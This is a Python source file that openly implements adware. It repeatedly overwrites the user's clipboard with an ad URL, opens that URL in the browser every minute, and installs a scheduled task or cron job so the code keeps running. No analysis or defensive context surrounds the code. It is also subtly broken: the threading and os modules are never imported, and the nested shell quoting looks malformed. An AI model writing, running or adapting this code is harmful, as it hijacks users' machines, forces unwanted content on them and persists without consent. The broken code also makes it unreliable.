import time
import win32clipboard
import webbrowser
import subprocess

def adware_clipboard_hijacking_persistent_ads(ad_url: str) -> None:
    def hijack_clipboard(ad_url):
        while True:
            try:
                win32clipboard.OpenClipboard()
                win32clipboard.EmptyClipboard()
                win32clipboard.SetClipboardText(ad_url)
                win32clipboard.CloseClipboard()
            except Exception as e:
                print(f"Error hijacking clipboard: {e}")
            time.sleep(60)

    def display_ads(ad_url):
        while True:
            try:
                webbrowser.open(ad_url)
            except Exception as e:
                print(f"Error displaying ad: {e}")
            time.sleep(60)

    def create_persistence_service(ad_url):
        if os.name == 'nt':
            service_name = 'AdwareService'
            service_command = f'schtasks /create /tn {service_name} /tr "pythonw -c \'import os; os.system(\\"pythonw -m adware_clipboard_hijacking_persistent_ads {ad_url}\")\'" /sc minute /mo 1'
        else:
            service_name = 'adware'
            service_command = f'echo "* * * * * python3 -c \\"import os; os.system(\\"python3 -m adware_clipboard_hijacking_persistent_ads {ad_url}\")\\"" | crontab -'
        
        try:
            subprocess.run(service_command, shell=True, check=True)
        except Exception as e:
            print(f"Error creating persistence service: {e}")

    clipboard_thread = threading.Thread(target=hijack_clipboard, args=(ad_url,))
    ads_thread = threading.Thread(target=display_ads, args=(ad_url,))
    persistence_thread = threading.Thread(target=create_persistence_service, args=(ad_url,))

    clipboard_thread.start()
    ads_thread.start()
    persistence_thread.start()

    clipboard_thread.join()
    ads_thread.join()
    persistence_thread.join()
